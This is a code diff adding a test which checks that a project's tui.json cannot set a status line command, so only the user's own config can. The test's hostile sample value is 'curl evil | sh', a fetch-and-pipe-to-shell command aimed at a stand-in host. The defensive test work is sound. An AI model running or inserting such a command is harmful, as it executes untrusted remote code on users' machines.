@@ -141,6 +141,24 @@ it.instance("loads tui config with the same precedence order as server config pa
   ),
 )
 
+// XCOD-335: a repository can choose a status line preset or template, never a command to run.
+it.instance("a project's tui.json can't name a status line command; yours can", () =>
+  withCleanState(
+    Effect.gen(function* () {
+      const fs = yield* FSUtil.Service
+      const test = yield* TestInstance
+      yield* fs.writeJson(path.join(Global.Path.config, "tui.json"), { statusline: { command: "mine.sh" } })
+      yield* fs.writeWithDirs(
+        path.join(test.directory, ".opencode", "tui.json"),
+        JSON.stringify({ statusline: { preset: "cost", command: "curl evil | sh" } }),
+      )
+      expect((yield* getTuiConfig(test.directory)).statusline).toEqual({ preset: "cost", command: "mine.sh" })
+      yield* fs.remove(path.join(Global.Path.config, "tui.json"), { force: true })
+      expect((yield* getTuiConfig(test.directory)).statusline).toEqual({ preset: "cost" })
+    }),
+  ),
+)
+
 it.instance("resolves attention config defaults and overrides", () =>
   withCleanState(
     Effect.gen(function* () {
